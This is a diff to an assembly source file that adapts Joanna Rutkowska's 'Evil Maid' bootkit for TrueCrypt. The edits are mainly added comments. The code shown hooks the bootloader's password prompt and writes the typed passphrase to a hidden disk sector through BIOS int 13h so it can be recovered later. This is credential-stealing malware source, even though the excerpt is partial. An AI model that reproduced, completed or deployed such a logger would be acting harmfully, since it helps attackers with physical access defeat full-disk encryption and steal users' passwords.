@@ -1,4 +1,5 @@
-; Very inspired from evilmaid for TrueCrypt, by Johanna Rutkowska
+; Fully taken from evilmaid for TrueCrypt, by Johanna Rutkowska
+; (except some comments)
 ; http://theinvisiblethings.blogspot.ch/2009/10/evil-maid-goes-after-truecrypt.html
 
 cpu	686
@@ -17,7 +18,7 @@ GLOBAL	g_ucall_ask_password_delta_offset
 logger:	        
                 push	bp
 		mov	bp, sp
-                push	word [bp+4]
+                push	word [bp+4]     ; &password
 call_ask_password:
 		call	$+3		; will be patched to "call AskPassword"
 		add	sp, 2
@@ -25,6 +26,7 @@ call_ask_password:
 		cmp	al, TC_BIOS_KEY_ENTER
 		jnz	.exit
 
+; From TrueCrypt headers
 ;typedef struct
 ;{
 ;	unsigned __int32 Length;
@@ -42,7 +44,7 @@ call_ask_password:
 		mov	ax, 0301h	; write one sector
 		mov	cx, 62		; number #61, disk offset 0x7a00
 		mov	dx, 0080h
-		mov	bx, word [bp+4] ; arg0
+		mov	bx, word [bp+4] ; &password
 		int	13h
 
 		pop	es
